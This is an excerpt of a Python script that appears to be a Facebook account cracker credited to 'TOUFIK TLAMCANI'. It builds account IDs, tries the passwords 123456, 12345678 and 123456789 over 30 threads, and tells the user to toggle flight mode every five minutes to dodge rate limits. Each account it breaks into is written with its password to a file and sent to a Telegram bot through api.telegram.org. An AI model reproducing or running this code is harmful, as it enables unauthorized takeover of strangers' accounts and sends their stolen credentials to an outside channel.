...
class Arafat:
    ...
    def settings(self):
       ...
       with tred(max_workers=30) as arafat:
           ...
           print('[✓] PASSWORD : 123456 + 12345678 + 123456789')
           print("[✓] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE ")
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','12345678','123456789']
    ...
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r\033[0;32m~>>  توفيق تلمساني - TOUFIK TLAMCANI~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/TOUFIK-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f''' تــم صـيـد حـسـاب فـيـسـبـوك 
ا-+-+-+-+-+-+-+-+-
...
🧸باسورد » {ps}
PY ~  @toufiktlamcani
ا-+-+-+-+-+-+-+-+-''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                 break
